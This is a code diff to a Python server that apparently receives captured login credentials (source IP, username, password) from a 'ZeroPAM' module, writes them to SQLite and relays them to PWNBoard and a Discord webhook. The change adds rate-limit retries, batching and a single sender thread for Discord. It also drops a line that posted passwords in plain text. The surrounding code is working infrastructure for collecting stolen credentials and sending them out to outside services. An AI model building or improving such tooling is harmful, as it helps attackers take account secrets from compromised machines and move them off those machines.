@@ -1,5 +1,6 @@
 import os
 import re
+import time
 import queue
 import socket
 import sqlite3
@@ -9,7 +10,7 @@ import threading
 import logging
 
 from contextlib import closing
-from typing import Optional
+from typing import Optional, List
 from dataclasses import dataclass
 from dotenv import load_dotenv
 from concurrent.futures import ThreadPoolExecutor
@@ -128,9 +129,14 @@ def send_pwnboard(event: LoginEvent, pwnhost: str) -> bool:
         logging.warning("PWNBoard POST error: %s", e)
         return False
 
-def send_discord(event: LoginEvent) -> None:
-    if not WEBHOOK_URL or event.message == "KEEP ALIVE":
-        return
+DISCORD_BATCH_MAX = 10          # Discord allows up to 10 embeds per message
+DISCORD_RETRY_LIMIT = 5         # give up on a batch after this many 429s
+DISCORD_DEFAULT_RETRY_AFTER = 0.5
+ 
+ 
+def _discord_embed(event: LoginEvent) -> Optional[dict]:
+    if event.message == "KEEP ALIVE":
+        return None
  
     fields = []
     color = 0
@@ -144,38 +150,92 @@ def send_discord(event: LoginEvent) -> None:
         fields = [{"name": "ADMIN USER", "value": event.username}]
         color = 0x07fc03
  
-    hook_data = {
-        "content": f"{event.source_ip} - {event.message}: {event.username}: {event.password}",
-        "username": "ZeroPAM Bot",
-        "avatar_url": "https://cdn.discordapp.com/emojis/1203535228975448094.webp",
-        "embeds": [{
-            "description": f"**UPDATED FROM {event.source_ip}**",
-            "fields": fields,
-            "color": color,
-        }],
+    return {
+        "description": f"**{event.message} FROM {event.source_ip}**",
+        "fields": fields,
+        "color": color,
     }
  
+ 
+def _post_discord(hook_data: dict, attempt: int = 0) -> None:
+    """POST one webhook payload, honoring Discord's rate-limit response.
+    204 is Discord's normal success code for webhooks (not 200)."""
     try:
         r = requests.post(WEBHOOK_URL, json=hook_data, timeout=5)
-        if r.status_code != 200:
-            logging.warning("Unsuccessful Discord POST: Code: %s, Response: %s", r.status_code, r.text)
     except requests.RequestException as e:
         logging.warning("Discord webhook error: %s", e)
-
-def dispatch_notifications(event: LoginEvent, retval: int, cmd_args, notify_pool: ThreadPoolExecutor) -> None:
-    """Queue webhook calls onto the notify pool -- never call them inline on
-    a connection-handling or DB thread, since they're the slowest, flakiest
-    part of the pipeline (network + a 3rd party's uptime)."""
-    def submit(fn, *args):
+        return
+ 
+    if r.status_code in (200, 204):
+        return
+ 
+    if r.status_code == 429 and attempt < DISCORD_RETRY_LIMIT:
+        retry_after = DISCORD_DEFAULT_RETRY_AFTER
         try:
-            notify_pool.submit(fn, *args)
+            retry_after = float(r.json().get("retry_after", retry_after))
+        except Exception:
+            pass
+        time.sleep(retry_after + 0.05)
+        _post_discord(hook_data, attempt + 1)
+        return
+ 
+    logging.warning("Unsuccessful Discord POST: Code: %s, Response: %s", r.status_code, r.text)
+ 
+ 
+def send_discord_batch(events: "List[LoginEvent]") -> None:
+    """Send up to DISCORD_BATCH_MAX events as ONE webhook message (multiple
+    embeds). Batching is what actually fixes rate limiting at volume --
+    it cuts the request count by up to 10x instead of retrying faster."""
+    if not WEBHOOK_URL:
+        return
+ 
+    embeds = [e for e in (_discord_embed(ev) for ev in events) if e is not None]
+    if not embeds:
+        return
+ 
+    hook_data = {
+        "username": "ZeroPAM Bot",
+        "avatar_url": "https://cdn.discordapp.com/emojis/1203535228975448094.webp",
+        "embeds": embeds,
+    }
+    _post_discord(hook_data)
+ 
+ 
+def discord_worker(discord_queue: "queue.Queue") -> None:
+    """Owns the ONE Discord sender. Serializing all sends through a single
+    thread (instead of a pool hammering the webhook concurrently) is what
+    keeps us under Discord's per-webhook rate limit in the first place."""
+    while True:
+        item = discord_queue.get()
+        if item is None:  # shutdown sentinel
+            break
+ 
+        batch = [item]
+        while len(batch) < DISCORD_BATCH_MAX:
+            try:
+                batch.append(discord_queue.get_nowait())
+            except queue.Empty:
+                break
+ 
+        send_discord_batch(batch)
+
+def dispatch_notifications(event: LoginEvent, retval: int, cmd_args, notify_pool: ThreadPoolExecutor,
+                            discord_queue: "queue.Queue") -> None:
+    """Route webhook work off the calling thread. PwnBoard has its own
+    rate limits per deployment, so it still goes to the general pool;
+    Discord goes through the single serialized discord_queue instead,
+    since that's what keeps it under Discord's rate limit."""
+    if cmd_args.discord and (not cmd_args.onlynew or retval == 1):
+        try:
+            discord_queue.put_nowait(event)
+        except queue.Full:
+            logging.warning("Discord queue full -- dropping a notification")
+ 
+    if cmd_args.pwnboard and cmd_args.onlynew and retval == 1:
+        try:
+            notify_pool.submit(send_pwnboard, event, cmd_args.pwnhost)
         except RuntimeError:
             pass  # pool is shutting down
- 
-    if cmd_args.discord and (not cmd_args.onlynew or retval == 1):
-        submit(send_discord, event)
-    if cmd_args.pwnboard and cmd_args.onlynew and retval == 1:
-        submit(send_pwnboard, event, cmd_args.pwnhost)
 
 def open_db(db_path: str = DB_PATH) -> sqlite3.Connection:
     conn = sqlite3.connect(db_path, check_same_thread=False)
@@ -235,7 +295,7 @@ def write_db_event(conn: sqlite3.Connection, event: LoginEvent) -> int:
     return retval
  
  
-def db_worker(db_queue: "queue.Queue", notify_pool: ThreadPoolExecutor, cmd_args) -> None:
+def db_worker(db_queue: "queue.Queue", notify_pool: ThreadPoolExecutor, discord_queue: "queue.Queue", cmd_args) -> None:
     """Drains db_queue sequentially on a single persistent connection. When
     a burst has queued up, drains everything currently available before
     issuing one commit, which turns N fsyncs into 1 under load without
@@ -264,14 +324,14 @@ def db_worker(db_queue: "queue.Queue", notify_pool: ThreadPoolExecutor, cmd_args
             if cmd_args.onlynew and retval == 1:
                 logging.info("Received from %s - %s", addr, raw_line.strip())
  
-            dispatch_notifications(event, retval, cmd_args, notify_pool)
+            dispatch_notifications(event, retval, cmd_args, notify_pool, discord_queue)
  
         try:
             conn.commit()
         except Exception:
             logging.exception("DB commit failed")
 
-def handle_client(c, addr, cmd_args, db_queue, notify_pool) -> None:
+def handle_client(c, addr, cmd_args, db_queue, notify_pool, discord_queue) -> None:
     try:
         c.settimeout(CLIENT_RECV_TIMEOUT)
         raw_data = c.recv(1024)
@@ -292,7 +352,7 @@ def handle_client(c, addr, cmd_args, db_queue, notify_pool) -> None:
  
         if cmd_args.nodb:
             # No DB means no "new info" detection, so retval is always 0.
-            dispatch_notifications(event, 0, cmd_args, notify_pool)
+            dispatch_notifications(event, 0, cmd_args, notify_pool, discord_queue)
             return
  
         try:
@@ -315,6 +375,9 @@ def start_server(cmd_args, stop_event=None):
     db_queue = queue.Queue(maxsize=DB_QUEUE_MAXSIZE) if not cmd_args.nodb else None
     notify_pool = ThreadPoolExecutor(max_workers=NOTIFY_WORKERS, thread_name_prefix="notify")
     client_pool = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_CLIENTS, thread_name_prefix="client")
+
+    discord_queue: "queue.Queue" = queue.Queue(maxsize=NOTIFY_QUEUE_MAXSIZE)
+    threading.Thread(target=discord_worker, args=(discord_queue,), daemon=True).start()
  
     if db_queue is not None:
         threading.Thread(target=db_worker, args=(db_queue, notify_pool, cmd_args), daemon=True).start()
@@ -346,7 +409,7 @@ def start_server(cmd_args, stop_event=None):
  
         def run():
             try:
-                handle_client(client_socket, addr, cmd_args, db_queue, notify_pool)
+                handle_client(client_socket, addr, cmd_args, db_queue, notify_pool, discord_queue)
             finally:
                 admission.release()
  
@@ -371,6 +434,7 @@ def start_server(cmd_args, stop_event=None):
             pass
         if db_queue is not None:
             db_queue.put(None)  # shutdown sentinel
+        discord_queue.put(None)
         client_pool.shutdown(wait=False)
         notify_pool.shutdown(wait=False)
 
